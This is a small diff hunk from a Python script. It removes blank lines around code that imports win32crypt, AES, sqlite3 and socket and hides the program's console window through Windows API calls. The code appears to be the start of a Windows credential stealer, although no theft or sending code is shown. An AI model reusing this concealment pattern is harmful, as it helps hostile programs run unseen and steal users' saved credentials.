@@ -2,13 +2,9 @@ import os, json, socket, base64, sqlite3, win32crypt, shutil, ctypes, getpass, r
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
 
-
 kernel32 = ctypes.WinDLL('kernel32')
-
 user32 = ctypes.WinDLL('user32')
-
 SW_HIDE = 0
-
 hWnd = kernel32.GetConsoleWindow()
 user32.ShowWindow(hWnd, SW_HIDE)
 
